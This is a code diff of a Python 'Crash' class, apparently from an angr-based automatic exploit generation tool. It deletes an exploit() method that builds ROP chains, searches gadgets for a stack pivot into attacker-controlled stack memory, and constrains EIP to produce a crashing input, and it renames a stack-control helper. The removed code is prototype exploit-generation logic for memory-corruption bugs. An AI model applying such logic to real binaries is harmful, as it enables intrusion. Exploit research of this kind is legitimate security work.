@@ -112,92 +112,9 @@ class Crash(object):
 
         return False
 
-
-    def exploit(self):
-        '''
-        generate an exploit based off the crash
-        '''
-
-        assert (self.crash_type is not None, "must call exploitable before trying to exploit")
-
-        if (self.crash_type == Crash.EIP_OVERWRITE):
-            #return self._eip_overwrite(
-
-            sp = self.state.se.any_int(self.state.regs.sp)
-
-            # first let's see what kind of stack control we have
-            symbolic_stack = self._stack_control()
-            if len(symbolic_stack) == 0:
-                l.error("no controlled data beneath stack, need to resort to shellcode")
-                return None
-
-            rop = angr.Project(self.binary).analyses.ROP()
-            rop.find_gadgets()
-
-            # at the moment we just do ECX for prototyping
-            try:
-                chain = rop.write_to_mem(0x6969, "mike")
-            except angr.analyses.rop.RopException:
-                l.error("unable to set requested register with ROP")
-                return None
-
-            chain_addr = None
-            stack_pivot = None
-            # loop until we can find a chain which gets us to our setter gadget
-            for addr in symbolic_stack:
-                pivot_gap = addr - sp
-                chain_req = chain.payload_len
-
-                # is the space too small?
-                if not symbolic_stack[addr] >= chain_req:
-                    continue
-
-                # okay we have a symbolic region which fits and is below sp
-                # can we pivot there?
-                for gadget in rop.gadgets:
-                    # let's make sure the gadget is sane
-
-                    # TODO: consult state before throwing out a gadget, some of these memory 
-                    # accesses might be acceptable
-                    if len(gadget.mem_changes + gadget.mem_writes + gadget.mem_reads) > 0:
-                        continue
-
-                    # if we assume all gadgets end in a 'ret' we can subtract 4 from the stack_change
-                    # as we're not interested in the ret's effect on stack movement, because when the
-                    # ret executes we'll have chain control
-
-                    jumps_to = sp + (gadget.stack_change - 4)
-                    # does it hit the controlled region?
-                    if jumps_to > addr and jumps_to < addr + symbolic_stack[addr]:
-                        if symbolic_stack[addr] - (jumps_to - addr) >= chain_req:
-                            # we're in!
-                            chain_addr = jumps_to
-                            stack_pivot = gadget
-                            break
-
-                if chain_addr is not None and stack_pivot is not None:
-                    break
-
-            # constrain jumps_to to equal the rop setter
-            # constrain eip to equal the stack_pivot
-            if chain_addr is None and stack_pivot is None:
-                l.error("unable to generate payload with the requested rop") 
-                return None
-
-            chain_set = self.state.memory.load(chain_addr, chain.payload_len) == self.state.BVV(chain.payload_str())
-            eip_set = self.state.regs.eip == stack_pivot.addr
-            
-            exploit = self.state.copy()
-
-            exploit.add_constraints(chain_set)
-            exploit.add_constraints(eip_set)
-
-            l.info("exploit generated")
-            return exploit.posix.dumps(0)
-
 ### UTIL
 
-    def _stack_control(self):
+    def stack_control(self):
         '''
         determine what symbolic memory we control equal to or beneath sp
         '''
